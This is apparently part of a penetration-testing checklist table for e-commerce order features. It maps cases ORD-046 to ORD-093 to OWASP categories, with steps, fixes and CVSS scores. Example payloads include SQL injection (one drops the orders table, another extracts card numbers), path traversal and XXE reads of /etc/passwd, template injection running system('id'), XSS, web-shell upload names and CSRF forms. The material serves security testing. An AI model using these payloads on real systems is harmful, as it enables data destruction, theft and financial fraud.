| ORD-046 | IDOR on Order Cancellation | Broken Access Control (WSTG-AUTHZ-04) | Order Cancellation | 1. Initiate order cancellation for own order. 2. Intercept the request and change order_id to another user's order. 3. Submit the cancellation request. | Application must verify that the authenticated user owns the order before allowing cancellation. | <code>Change POST /api/orders/cancel with order_id=1001 to order_id=1002</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-047 | Cancelling Already Shipped or Delivered Orders | Business Logic (WSTG-BUSL-02) | Order Cancellation | 1. Identify an order with status shipped or delivered. 2. Attempt to cancel this order via API. 3. Check if cancellation is processed despite invalid state. | Application must enforce order state machine rules and prevent cancellation of shipped or delivered orders. | <code>POST /api/orders/cancel with order_id of an already-delivered order</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-048 | Race Condition on Cancellation and Shipment | Business Logic (WSTG-BUSL-08) | Order Cancellation | 1. Simultaneously send a cancellation request and a shipment confirmation request for the same order. 2. Check which one succeeds or if both succeed causing an inconsistent state. | Application must implement proper locking to prevent simultaneous cancellation and shipment of the same order. | <code>Send concurrent POST /api/orders/cancel and POST /api/orders/ship for the same order_id</code> | Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Turbo Intruder;Burp Suite | CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine |
| ORD-049 | Unauthorized Cancellation by Non-Owner | Broken Access Control (WSTG-AUTHZ-02) | Order Cancellation | 1. Login as User A. 2. Attempt to cancel an order belonging to User B using User B's order_id. 3. Check if the application allows the cancellation. | Application must strictly verify order ownership and deny cancellation requests from non-owners. | <code>POST /api/orders/cancel with User B's order_id while authenticated as User A</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-050 | CSRF on Order Cancellation | CSRF (WSTG-SESS-05) | Order Cancellation | 1. Craft a malicious page that auto-submits a cancellation request for the victim's active order. 2. Lure the victim to visit the page. 3. Check if the order is cancelled. | Application must validate CSRF tokens on cancellation requests to prevent cross-site forgery. | <code>&lt;img src='https://target.com/api/orders/cancel?order_id=1001'&gt; or auto-submit form</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Custom HTML | CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite |
| ORD-051 | Refund Manipulation During Cancellation | Business Logic (WSTG-BUSL-01) | Order Cancellation | 1. Cancel an order and intercept the cancellation request. 2. Modify the refund_amount parameter to a higher value than the original order. 3. Submit and check if excess refund is processed. | Application must calculate refund amounts server-side based on the actual order value and not accept client-specified refund amounts. | <code>Change refund_amount=50.00 to refund_amount=500.00 in cancellation request</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-052 | Mass Cancellation via API Abuse | Business Logic (WSTG-BUSL-05) | Order Cancellation | 1. Capture the cancellation API endpoint. 2. Script automated requests to cancel multiple orders in bulk. 3. Check if rate limiting or bulk cancellation prevention exists. | Application must implement rate limiting and prevent bulk cancellation abuse especially for competitor sabotage scenarios. | <code>Script to send POST /api/orders/cancel for order_ids 1001 through 2000</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite Intruder;Custom Scripts | CWE-840; PortSwigger Business logic |
| ORD-053 | Cancellation After Refund Already Processed | Business Logic (WSTG-BUSL-02) | Order Cancellation | 1. Cancel an order and receive a refund. 2. Attempt to cancel the same order again. 3. Check if a double refund is issued. | Application must track cancellation and refund status to prevent double refund processing. | <code>POST /api/orders/cancel for an already-cancelled-and-refunded order_id</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-054 | SQL Injection in Cancellation Reason Field | Injection (WSTG-INPV-05) | Order Cancellation | 1. Cancel an order and provide a cancellation reason. 2. Inject SQL payload in the reason field. 3. Submit and observe the response. | Application must use parameterized queries and sanitize the cancellation reason input. | <code>cancellation_reason=test' OR 1=1; DROP TABLE orders;--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ORD-055 | Cancellation Bypass via Status Manipulation | Business Logic (WSTG-BUSL-02) | Order Cancellation | 1. Intercept cancellation request. 2. Modify the order status parameter to allow cancellation of non-cancellable orders. 3. Check if state validation is server-side. | Application must validate order state transitions server-side and not trust client-provided status values. | <code>Add force_cancel=true or override_status=pending to cancellation request body</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-056 | IDOR on Order Modification | Broken Access Control (WSTG-AUTHZ-04) | Order Modification | 1. Modify own order details like shipping address or quantity. 2. Intercept the request and change order_id to another user's order. 3. Submit the modification. | Application must verify order ownership before allowing any modifications. | <code>Change PUT /api/orders/1001/modify to /api/orders/1002/modify</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-057 | Price Manipulation During Modification | Business Logic (WSTG-BUSL-01) | Order Modification | 1. Modify an existing order and intercept the request. 2. Change the item price or total_amount parameter. 3. Submit and verify if modified price is accepted. | Application must recalculate all prices server-side during order modification and not accept client-provided prices. | <code>Change item_price=99.99 to item_price=1.00 in PUT /api/orders/modify body</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-058 | Modifying Order After Cutoff Time | Business Logic (WSTG-BUSL-02) | Order Modification | 1. Identify an order past the modification window (e.g. already processing or shipped). 2. Attempt to modify it via API. 3. Check if modification is accepted. | Application must enforce modification time windows and order state restrictions server-side. | <code>PUT /api/orders/modify for an order with status=processing or status=shipped</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-059 | Adding Items to Order Without Paying | Business Logic (WSTG-BUSL-01) | Order Modification | 1. Modify an existing order to add additional items. 2. Intercept the request and keep the total amount unchanged. 3. Check if extra items are added without additional payment. | Application must recalculate the total after any item additions and require payment for the difference. | <code>Add item_id=999 to order items array while keeping total_amount unchanged</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-060 | Unauthorized Order Modification by Non-Owner | Broken Access Control (WSTG-AUTHZ-02) | Order Modification | 1. As User A attempt to modify User B's order. 2. Use User B's order_id with User A's authentication token. 3. Check if modification is processed. | Application must enforce strict ownership checks before processing any order modification. | <code>PUT /api/orders/1002/modify with User A's auth token</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-061 | CSRF on Order Modification | CSRF (WSTG-SESS-05) | Order Modification | 1. Craft a malicious page that auto-submits a modification request for the victim's order. 2. Modify shipping address to attacker's address. 3. Check if modification succeeds. | Application must validate anti-CSRF tokens on all order modification requests. | <code>Auto-submit form changing shipping_address to attacker's address for victim's order_id</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Custom HTML | CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite |
| ORD-062 | Mass Assignment in Order Modification | Mass Assignment (WSTG-INPV-01) | Order Modification | 1. Modify an order via API. 2. Add hidden parameters like discount_applied=true or order_status=completed or is_priority=true. 3. Check if unauthorized fields are modified. | Application must whitelist modifiable fields and reject any unauthorized parameter changes. | <code>Add discount_applied=true&amp;priority=high&amp;admin_override=true to PUT body</code> | Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA |
| ORD-063 | Race Condition on Modification and Payment | Business Logic (WSTG-BUSL-08) | Order Modification | 1. Simultaneously send a modification request (reducing price) and a payment capture request. 2. Check if payment is captured at original price while order reflects modified lower price. | Application must implement atomic transactions to ensure price consistency between modification and payment. | <code>Concurrent PUT /api/orders/modify (lower price) and POST /api/payments/capture</code> | Race condition -&gt; limit/uniqueness bypass (duplicate accounts, rate-limit defeat, double-spend). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Turbo Intruder;Burp Suite | CWE-362; -&gt;[Race Condition checklist](#/checklist/racecondition); James Kettle Smashing the State Machine |
| ORD-064 | Quantity Change to Exceed Stock | Business Logic (WSTG-BUSL-01) | Order Modification | 1. Modify an order to increase quantity beyond available stock. 2. Intercept request and set quantity to a very high number. 3. Check if overselling is possible via modification. | Application must validate stock availability during order modification just as it does during initial placement. | <code>Change quantity=1 to quantity=99999 in order modification request</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-065 | IDOR on Return Request | Broken Access Control (WSTG-AUTHZ-04) | Return / Exchange Request | 1. Submit a return request for own order. 2. Intercept the request and change order_id to another user's order. 3. Check if return is processed for another user's order. | Application must verify that the return request is made by the order owner. | <code>Change POST /api/returns with order_id=1001 to order_id=1002</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-066 | Returning Already Returned Items | Business Logic (WSTG-BUSL-02) | Return / Exchange Request | 1. Submit a return request for an order that has already been returned. 2. Check if a duplicate return and refund is processed. | Application must track return status and prevent duplicate return requests for the same order or item. | <code>POST /api/returns for an order_id already in status=returned</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-067 | Return Request After Return Window Expiry | Business Logic (WSTG-BUSL-02) | Return / Exchange Request | 1. Identify an order past the return window (e.g. 30 days). 2. Attempt to submit a return request via API. 3. Modify date parameters if present. 4. Check if return is accepted. | Application must validate return eligibility based on server-side order date and enforce return window policies. | <code>POST /api/returns for order placed 60 days ago; tamper order_date or return_window parameters</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-068 | Refund Amount Manipulation on Return | Business Logic (WSTG-BUSL-01) | Return / Exchange Request | 1. Submit a return request. 2. Intercept the request and modify refund_amount to a higher value than the item price. 3. Submit and check if inflated refund is processed. | Application must calculate refund amounts server-side based on original order data and ignore client-specified amounts. | <code>Change refund_amount=25.00 to refund_amount=250.00 in return request</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-069 | Exchange to Higher Value Item Without Paying Difference | Business Logic (WSTG-BUSL-01) | Return / Exchange Request | 1. Submit an exchange request replacing a low-value item with a higher-value item. 2. Intercept the request and manipulate the price_difference parameter. 3. Check if exchange processes without additional payment. | Application must calculate price differences server-side and require payment for any upgrade. | <code>Change price_difference=50.00 to price_difference=0.00 in exchange request</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-070 | SQL Injection in Return Reason Field | Injection (WSTG-INPV-05) | Return / Exchange Request | 1. Submit a return request. 2. Inject SQL payload in the return_reason field. 3. Submit and observe the response for SQL errors. | Application must use parameterized queries and sanitize the return reason input. | <code>return_reason=defective' UNION SELECT credit_card FROM payments--</code> | SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | SQLMap;Burp Suite | CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings |
| ORD-071 | File Upload Vulnerability in Return Evidence | File Upload (WSTG-INPV-12) | Return / Exchange Request | 1. Upload proof images for return request. 2. Upload a malicious file like a web shell renamed as .jpg. 3. Attempt to access the uploaded file and execute it. | Application must validate file type by content not extension and store uploads outside web root with no execute permissions. | <code>Upload shell.php.jpg or shell.php%00.jpg as return evidence image</code> | Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Custom Scripts | CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick |
| ORD-072 | XSS in Return Request Comments | Cross-Site Scripting (WSTG-INPV-02) | Return / Exchange Request | 1. Submit a return request with XSS payload in the comments or reason field. 2. View the return request in admin or customer panel. 3. Check if script executes. | Application must sanitize and encode all user-provided text in return requests. | <code>return_comments=&lt;img src=x onerror=alert(document.domain)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;XSS Hunter | CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53 |
| ORD-073 | Returning Items Not in Original Order | Business Logic (WSTG-BUSL-02) | Return / Exchange Request | 1. Submit a return request. 2. Modify the item_id in the request to an item not part of the original order. 3. Check if the return is processed for the wrong item. | Application must validate that returned items belong to the specified order before processing the return. | <code>Change item_id=ABC in return request to item_id=XYZ which was not in the order</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-074 | CSRF on Return / Exchange Submission | CSRF (WSTG-SESS-05) | Return / Exchange Request | 1. Craft a malicious page that auto-submits a return request for the victim's order. 2. Have the victim visit the page. 3. Check if the return is submitted. | Application must validate CSRF tokens on all return and exchange submission forms. | <code>&lt;form action='https://target.com/api/returns' method='POST'&gt;&lt;input name='order_id' value='1001'&gt;&lt;input name='reason' value='fraud'&gt;&lt;/form&gt;</code> | CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Custom HTML | CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite |
| ORD-075 | IDOR on Reorder Functionality | Broken Access Control (WSTG-AUTHZ-04) | Reorder / Buy Again | 1. Use reorder function for own previous order. 2. Intercept request and change order_id to another user's order. 3. Check if items from another user's order are added to your cart. | Application must verify order ownership before allowing reorder and only permit reorder of own orders. | <code>Change POST /api/orders/reorder with order_id=1001 to order_id=1002</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-076 | Price Discrepancy on Reorder | Business Logic (WSTG-BUSL-01) | Reorder / Buy Again | 1. Reorder an item whose price has changed since the original order. 2. Intercept the request and check if the old price is used. 3. Try to force the old price. | Application must use current prices for reorders and not the historical price from the original order unless explicitly guaranteed. | <code>Check if reorder uses original item_price=10.00 instead of current_price=15.00; tamper to force old price</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-077 | Reordering Discontinued or Out-of-Stock Items | Business Logic (WSTG-BUSL-02) | Reorder / Buy Again | 1. Attempt to reorder items that are now discontinued or out of stock. 2. Check if the reorder processes successfully despite unavailability. | Application must validate item availability during reorder and inform the user if items are unavailable. | <code>POST /api/orders/reorder for order containing discontinued item_id</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-078 | Reorder with Expired Payment Method | Business Logic (WSTG-BUSL-02) | Reorder / Buy Again | 1. Reorder using a previously stored but now expired or invalid payment method. 2. Check if payment is attempted on the invalid method or if proper validation occurs. | Application must validate payment method validity during reorder and prompt for updated payment if method is expired. | <code>POST /api/orders/reorder with payment_method_id pointing to expired card</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-079 | Coupon Code Replay on Reorder | Business Logic (WSTG-BUSL-01) | Reorder / Buy Again | 1. Reorder an item that originally had a promotional discount. 2. Check if the expired or used coupon is automatically reapplied. 3. Attempt to inject old coupon code. | Application must validate coupon eligibility at the time of reorder and not automatically reapply expired promotions. | <code>POST /api/orders/reorder with original coupon_code=EXPIRED50 in the request</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ORD-080 | Authentication Bypass on Reorder API | Authentication (WSTG-ATHN-01) | Reorder / Buy Again | 1. Capture reorder API request. 2. Remove authentication token. 3. Submit the request. 4. Check if reorder processes without authentication. | Application must require valid authentication for all reorder operations. | <code>Remove Authorization header from POST /api/orders/reorder</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ORD-081 | Mass Reorder Abuse for Inventory Depletion | Business Logic (WSTG-BUSL-05) | Reorder / Buy Again | 1. Script automated reorder requests for limited-stock items. 2. Send many concurrent reorder requests. 3. Check if inventory is depleted maliciously. | Application must implement rate limiting on reorder and validate stock before processing each request. | <code>Send 100 concurrent POST /api/orders/reorder for limited-stock item</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Turbo Intruder;Custom Scripts | CWE-840; PortSwigger Business logic |
| ORD-082 | IDOR on Invoice Download | Broken Access Control (WSTG-AUTHZ-04) | Order Invoice / Receipt | 1. Download invoice for own order. 2. Intercept the request and change invoice_id or order_id to another user's. 3. Check if another user's invoice is downloaded. | Application must verify order ownership before serving invoices and only allow download of own invoices. | <code>Change GET /api/invoices/INV-1001 to INV-1002 or GET /api/orders/1002/invoice</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-083 | Path Traversal in Invoice Download | Path Traversal (WSTG-INPV-10) | Order Invoice / Receipt | 1. Download an invoice and intercept the request. 2. Modify the file path parameter to traverse directories. 3. Attempt to read arbitrary server files. | Application must validate file paths strictly and prevent directory traversal in invoice download functionality. | <code>GET /api/invoices/download?file=../../../etc/passwd or file=..%2F..%2F..%2Fetc%2Fpasswd</code> | Path traversal -&gt; secret/cross-user file read or out-of-dir write -&gt; RCE. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-22; -&gt;[Path Traversal checklist](#/checklist/pathtraversal); PortSwigger path traversal; Orange Tsai |
| ORD-084 | Invoice Enumeration and Mass Download | Information Disclosure (WSTG-INFO-04) | Order Invoice / Receipt | 1. Note the invoice numbering pattern. 2. Enumerate sequential invoice IDs. 3. Attempt to download all invoices in range. | Application must use non-sequential unpredictable invoice IDs and enforce authorization on each download. | <code>Enumerate GET /api/invoices/INV-00001 through INV-99999</code> | Username/account enumeration -&gt; a valid-target list that fuels credential stuffing / phishing / ATO. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite Intruder;ffuf | CWE-204; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-IDNT-04 |
| ORD-085 | XSS in Invoice PDF Generation | Cross-Site Scripting (WSTG-INPV-02) | Order Invoice / Receipt | 1. Place an order with XSS payloads in name or address fields. 2. Generate the invoice PDF. 3. Check if XSS payload is rendered in the PDF viewer or HTML invoice. | Application must sanitize all dynamic content before including it in invoice generation templates. | <code>billing_name=&lt;script&gt;alert('XSS')&lt;/script&gt; or address=&lt;iframe src=javascript:alert(1)&gt;</code> | Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise. | High | 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) | Burp Suite;Browser | CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53 |
| ORD-086 | Server-Side Template Injection in Invoice | Injection (WSTG-INPV-18) | Order Invoice / Receipt | 1. Place an order with SSTI payloads in name or address fields. 2. Generate invoice. 3. Check if the template engine processes the payload. | Application must escape template syntax in user-provided data before rendering invoices. | <code>customer_name={{7&#42;7}} or address=${7&#42;7} or address=&lt;%= system('id') %&gt;</code> | Server-side template injection -&gt; remote code execution on the app server. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Tplmap | CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle) |
| ORD-087 | Invoice Tampering for Fraud | Business Logic (WSTG-BUSL-01) | Order Invoice / Receipt | 1. Download an invoice. 2. Check if any invoice data can be modified via API. 3. Attempt to change invoice amounts or details by intercepting invoice generation request. | Application must generate invoices from server-side order data only and not allow client-side manipulation of invoice content. | <code>Modify invoice_total or tax_amount in invoice generation request body</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
| ORD-088 | Sensitive Data Exposure in Invoice | Information Disclosure (WSTG-INFO-05) | Order Invoice / Receipt | 1. Download an invoice and review its content. 2. Check for exposure of full payment card numbers or internal system IDs or seller personal details. | Invoice must only contain necessary business information with masked payment details. | <code>Review PDF for full card numbers; internal IDs; employee details; system information</code> | Sensitive data / secret exposure -&gt; credential or token disclosure enabling further attack. | High | 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N) | Manual Review;Burp Suite | CWE-200; -&gt;[JWT checklist](#/checklist/jwt); OWASP WSTG-ATHN; PortSwigger |
| ORD-089 | Unauthenticated Invoice Access via Direct URL | Authentication (WSTG-ATHN-01) | Order Invoice / Receipt | 1. Copy the direct URL of an invoice download. 2. Open it in an incognito browser without logging in. 3. Check if the invoice is accessible without authentication. | Application must require authentication for all invoice access and not serve invoices via publicly accessible URLs. | <code>Access GET /api/invoices/download/INV-1001.pdf without any session or token</code> | Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat). | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Browser;Burp Suite | CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups |
| ORD-090 | XXE in Invoice XML Processing | Injection (WSTG-INPV-07) | Order Invoice / Receipt | 1. If invoice generation involves XML processing intercept and inject XXE payload. 2. Submit and check if external entities are resolved. | Application must disable external entity resolution in all XML parsers used for invoice generation. | <code>&lt;?xml version='1.0'?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;invoice&gt;&lt;name&gt;&amp;xxe;&lt;/name&gt;&lt;/invoice&gt;</code> | XXE -&gt; local file read / SSRF / OOB exfiltration. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;OWASP ZAP | CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XXE |
| ORD-091 | IDOR on Delivery Schedule Modification | Broken Access Control (WSTG-AUTHZ-04) | Delivery Scheduling | 1. Schedule a delivery for own order. 2. Intercept the request and change order_id to another user's order. 3. Modify the delivery schedule for another user. | Application must verify order ownership before allowing delivery schedule changes. | <code>Change PUT /api/orders/1001/delivery-schedule to /api/orders/1002/delivery-schedule</code> | IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale. | Critical | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) | Burp Suite;Postman | CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA |
| ORD-092 | Past Date Delivery Scheduling | Input Validation (WSTG-INPV-01) | Delivery Scheduling | 1. Schedule a delivery and intercept the request. 2. Set the delivery_date to a past date. 3. Submit and check if the past date is accepted. | Application must validate that delivery dates are in the future and within acceptable range. | <code>delivery_date=2020-01-01 or delivery_date=1970-01-01</code> | Improper input validation -&gt; downstream injection / logic abuse. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet |
| ORD-093 | Scheduling Delivery to Restricted Areas | Business Logic (WSTG-BUSL-01) | Delivery Scheduling | 1. Schedule delivery and intercept request. 2. Modify the delivery address or zone to a restricted or non-serviceable area. 3. Check if scheduling accepts it. | Application must validate delivery zones and addresses server-side and reject unserviceable locations. | <code>Change delivery_zone=serviceable_area to delivery_zone=restricted_area or delivery_zip=00000</code> | Business-logic flaw in this flow -&gt; control bypass with security or financial impact. | Medium | 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) | Burp Suite;Postman | CWE-840; PortSwigger Business logic |
